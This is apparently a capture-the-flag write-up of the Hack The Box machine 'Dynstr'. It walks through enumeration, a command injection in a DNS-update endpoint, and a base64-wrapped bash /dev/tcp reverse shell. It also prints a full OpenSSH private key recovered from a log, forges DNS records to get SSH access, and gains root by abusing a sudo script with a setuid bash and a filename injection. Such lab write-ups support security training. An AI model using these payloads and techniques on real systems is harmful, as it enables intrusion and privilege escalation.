## Default Information
IP address : 10.10.10.244\
OS : Linux

## Enumeration
Firstly, let us enumerate all the open ports using ```Nmap```
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```bash
nmap -sC -sV -A -p- -T4 10.10.10.244 -vv
```

From the output of ```NMAP```, we are able to obtain the following information about the open TCP ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | Open |
| 53	| domain | syn-ack ISC BIND 9.16.1 (Ubuntu Linux) | Open |
| 80	| http | Apache httpd 2.4.41 (Ubuntu) | Open |

Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
```
nmap -sU -Pn 10.10.10.244 -T4 -vv 
```

## Discovery
Looking through the webpages, we are able to discover several domains and credentials related this challenge.

![Dynstr domains](https://github.com/joelczk/writeups/blob/main/HTB/Images/dyntsr/dynstr_domains.PNG)

<img src = "https://github.com/joelczk/writeups/blob/main/HTB/Images/dyntsr/dynstr_email_domains.PNG" width = "2000">

Next, we will try to find for subdomains for the domains using ```subfinder```. However, we are unable to find any subdomains for all the domains above. 
Now, we will add these domains into the ```etc/hosts``` file
```
10.10.10.244    dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb dns@dyna.htb
```

We will now run ```gobuster``` on ```http://dyna.htb``` to enumerate the directories on the endpoints
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://dyna.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.244
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/20 20:59:12 Starting gobuster in directory enumeration mode
===============================================================
http://dyna.htb/assets               (Status: 301) [Size: 313] [--> http://10.10.10.244/assets/]
http://dyna.htb/nic                  (Status: 301) [Size: 310] [--> http://10.10.10.244/nic/]   
http://dyna.htb/server-status        (Status: 403) [Size: 277]                                  
                                                                                                    
===============================================================
2021/08/20 21:18:41 Finished
===============================================================
```

Afterwards, we will run ```gobuster``` again on ```http://dyba.htb/nic``` to enumerate the endpoints
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://dyna.htb/nic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.244/nic
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/20 21:01:38 Starting gobuster in directory enumeration mode
===============================================================
http://dyna.htb/nic/update               (Status: 200) [Size: 8]
                                                                    
===============================================================
2021/08/20 21:21:04 Finished
```
We will now visit the ```/nic/update``` endpoints, and we notice that we are returned with a ```badauth```. After some research, we found from [here](https://www.noip.com/integrate/request)
that this endpoints takes in a request of the following format:
```
GET /nic/update?hostname=mytest.example.com&myip=192.0.2.25 HTTP/1.1
Host: dynupdate.no-ip.com
Authorization: Basic base64-encoded-auth-string
```

Next, what we have to do is to find the base64-encoded-auth string. From earlier, we are able to know that the username is ```dynadns``` and the password is ```sndanyd```. Hence, we 
can know that the auth-string will be ```dynadns:sndanyd```. Now we we base64 encode the authentication string.
```
┌──(kali㉿kali)-[~]
└─$ echo -n "dynadns:sndanyd" | base64
ZHluYWRuczpzbmRhbnlk
```
Editing the request for ```/nic/update```, we get a wrong domain error ```911 [wrngdom: htb]```. The request that we are using is as follows:

```
GET /nic/update?hostname=dyna.htb HTTP/1.1
Host: dyna.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic ZHluYWRuczpzbmRhbnlk
Connection: close
Upgrade-Insecure-Requests: 1
```

After a while, we realized changing the parameter for hostname in the url path to ```dynamicdns.no-ip.htb``` allows us to receive a response as follows:

```
HTTP/1.1 200 OK
Date: Sat, 21 Aug 2021 02:47:35 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 18
Connection: close
Content-Type: text/html; charset=UTF-8

good <Redacted IP address>
```

We also realized that changing the hostname to ```;'dynamicdns.no-ip.htb``` will return an error code ```911 [nsupdate failed]```. This is an indication that this endpoint is vulnerable to command injection. We will first create a POC to execute ```id``` and ```whoami``` command. We will modify the payload by first encoding the payload ```" | id&&whoami```. The URL encoded payload for hostname will be ```%22%20%7c%20id%26%26whoami;dynamicdns.no-ip.htb```. In the response, we are able to receive the output to the 2 commands, which showed that the POC is successful.
```
HTTP/1.1 200 OK
Date: Sat, 21 Aug 2021 04:16:35 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 81
Connection: close
Content-Type: text/html; charset=UTF-8

uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
good <Redacted IP address>
```

## Obtaining User flag
Firstly, we have to obtain a Base64 encoding of the following payload:
```
bash -i >& /dev/tcp/<IP address of your local machine>/3000 0>&1
```

Afterwards, we have to replace the hostname payload on the URL with a URL-encoded payload of the following format:
```
" | echo <Base 64 encoded payload>|base64 -d|bash;dynamicdns.no-ip.htb
```
After obtaining the reverse shell on our local machine, we will have to first stabilize the shell.
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000                              
listening on [any] 3000 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.10.244] 47558
bash: cannot set terminal process group (794): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ic$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@dynstr:/var/www/html/nic$ export TERM=xterm
export TERM=xterm
www-data@dynstr:/var/www/html/nic$ stty cols 132 rows 34
stty cols 132 rows 34
```
We were able to find the user flag in ```/home/bindmgr``` directory. However, we realize that we do not have the correct privileges to view the file.
```
www-data@dynstr:/var/www/html/nic$ cd /home/bindmgr
cd /home/bindmgr
www-data@dynstr:/home/bindmgr$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@dynstr:/home/bindmgr$ 
```

Viewing the ```strace-C62796521.txt``` in the same directory, we were able to find an OPENSSH key that we will save to our local directory and try to SSH into the server.
```
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
```

After cleaning up the key file, we will save it to a ```ssh_key``` file and try to SSH into the server. However, we still require a password to SSH into the server.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i ssh_key bindmgr@10.10.10.244                                                         6 ⚙
bindmgr@10.10.10.244's password: 
```

Let's go back to check if we can find anything else that we are missing. True enough, in the ```/var/www/html/nic``` directory, we found a ```update``` file. Viewing the source code in the ```update``` file, we know that ```/usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key``` is being executed. The main reason why we could not SSH into the server was because our IP address is not in the zone.
```
  if(isset($_GET['hostname'])) {
    // Check for a valid domain
    list($h,$d) = explode(".",$_GET['hostname'],2);
    $validds = array('dnsalias.htb','dynamicdns.htb','no-ip.htb');
    if(!in_array($d,$validds)) { echo "911 [wrngdom: $d]\n"; exit; }
    // Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
    // Return good or 911
    if (!$retval) {
      echo "good $myip\n";
    } else {
      echo "911 [nsupdate failed]\n"; exit;
    }
  } else {
    echo "nochg $myip\n";
  }
```

Now, let us go to the ```/etc/bind``` directory to find out the type of keys that we have.
```
www-data@dynstr:/$ cd /etc/bind
cd /etc/bind
www-data@dynstr:/etc/bind$ ls -la
ls -la
total 68
drwxr-sr-x  3 root bind 4096 Mar 20 12:00 .
drwxr-xr-x 80 root root 4096 Jun  8 19:20 ..
-rw-r--r--  1 root root 1991 Feb 18  2021 bind.keys
-rw-r--r--  1 root root  237 Dec 17  2019 db.0
-rw-r--r--  1 root root  271 Dec 17  2019 db.127
-rw-r--r--  1 root root  237 Dec 17  2019 db.255
-rw-r--r--  1 root root  353 Dec 17  2019 db.empty
-rw-r--r--  1 root root  270 Dec 17  2019 db.local
-rw-r--r--  1 root bind  100 Mar 15 20:44 ddns.key
-rw-r--r--  1 root bind  101 Mar 15 20:44 infra.key
drwxr-sr-x  2 root bind 4096 Mar 15 20:42 named.bindmgr
-rw-r--r--  1 root bind  463 Dec 17  2019 named.conf
-rw-r--r--  1 root bind  498 Dec 17  2019 named.conf.default-zones
-rw-r--r--  1 root bind  969 Mar 15 20:46 named.conf.local
-rw-r--r--  1 root bind  895 Mar 15 20:46 named.conf.options
-rw-r-----  1 bind bind  100 Mar 15 20:14 rndc.key
-rw-r--r--  1 root root 1317 Dec 17  2019 zones.rfc1918
```

Let's first do a POC to check if we can successfully add our infra.key to the DNS records. From the output, we can see that we have successfully added infra.key to our DNS records
```
www-data@dynstr:/$ nsupdate -k /etc/bind/infra.key
nsupdate -k /etc/bind/infra.key
> update add test.infra.dyna.htb 86400 a 10.10.16.250
update add test.infra.dyna.htb 86400 a 10.10.16.250
> send
send
> show
show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
> quit
quit
www-data@dynstr:/$ nslookup test.infra.dyna.htb
nslookup test.infra.dyna.htb
Server:         127.0.0.1
Address:        127.0.0.1#53
Name:   test.infra.dyna.htb
Address: 10.10.16.250
www-data@dynstr:/$ 
```
However, we will still not be able to SSH with this new DNS record. The reason being that SSH does reverse IP address lookup. Hence, we will need to add a PTR record to the DNS entry. Additionally, we will not be able to use the DNS zone that we have created above as they have already been activated.
```
www-data@dynstr:/$ nsupdate -k /etc/bind/infra.key
nsupdate -k /etc/bind/infra.key
> update add check.infra.dyna.htb 86400 A 10.10.16.250
update add check.infra.dyna.htb 86400 A 10.10.16.250
> 

> update add 250.16.10.10.in-addr.arpa 300 PTR check.infra.dyna.htb
update add 250.16.10.10.in-addr.arpa 300 PTR check.infra.dyna.htb
> show
show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
250.16.10.10.in-addr.arpa. 300  IN      PTR     check.infra.dyna.htb.

> 

> send
send
> quit
quit
```
Now, we will SSH into the server and we would realize that we no longer require a password to SSH into the server.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i ssh_key bindmgr@10.10.10.244                                                         8 ⚙
Last login: Tue Jun  8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
bindmgr@dynstr:~$ ls
support-case-C62796521  user.txt
bindmgr@dynstr:~$ cat user.txt
<Redacted user flag>
bindmgr@dynstr:~$ 
```

## Obtaining system flag
First, we will run ```sudo -l``` to check the permissions of the binaries and we realize that ```/usr/local/bin/bindmgr.sh``` can be executed with root privileges without any password.
```
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
bindmgr@dynstr:~$ 
```

### Code Analysis of bindmgr.sh
The first part of the code shows that the current directory would require a ```.version``` file with a version number as the command ```cat .version``` is being executed.
```
# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi
```

The second part of the code creates a ```/etc/bind/named.conf.bindmgr``` configuration file, and prints all the files in the ```/etc/bind/named.bindmgr``` directory into the configuration file.
```
# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done
```

The third part of the code copies all the files in the current directory to ```/etc/bind/named.bindmgr```
```
# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/
```

### Exploit
First, we will have to create a version file with a version number
```
echo "2" > .version
```
Next, we will have to copy the ```/bin/bash``` binary so that we can get a privileged binary when the script is executed.
```
bindmgr@dynstr:~$ cp /bin/bash .
bindmgr@dynstr:~$ ls -la
total 1196
drwxr-xr-x 5 bindmgr bindmgr    4096 Aug 21 12:45 .
drwxr-xr-x 4 root    root       4096 Mar 15 20:26 ..
-rwxr-xr-x 1 bindmgr bindmgr 1183448 Aug 21 12:45 bash
lrwxrwxrwx 1 bindmgr bindmgr       9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr    3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr    4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr     807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr    4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr    4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr      33 Aug 21 11:54 user.txt
-rw-rw-r-- 1 bindmgr bindmgr       2 Aug 21 12:40 .version
```
Afterwards, we will have to give the binary setuid bits and also create a ```--preserve=mode``` so that the script executes ```cp --preserve=mode /etc/bind/named.bindmgr``` which allows the privilege on bash to be preserved when the script is executed.
```
bindmgr@dynstr:~$ chmod +s bash
bindmgr@dynstr:~$ echo > --preserve=mode
bindmgr@dynstr:~$ ls
 bash  '--preserve=mode'  support-case-C62796521   user.txt
```
Next, we will have to execute the script so that the bash biinary with root privileges will be copied to ```/etc/bind/named.bindmgr```
```
bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: -r not specified; omitting directory 'support-case-C62796521'
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'h�ȀE�'
    /etc/bind/named.bindmgr/bash:40: unknown option '�YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
```
Lastly, we will just have to navigate to ```/etc/bind/named.bindmgr``` so that the bash can be executed with root privileges and obtain the system flag.
```
bindmgr@dynstr:~$ cd /etc/bind/named.bindmgr
bindmgr@dynstr:/etc/bind/named.bindmgr$ ./bash -p
bash-5.0# cd /root/
bash-5.0# cat root.txt
<Redacted system flag>
bash-5.0# 
```
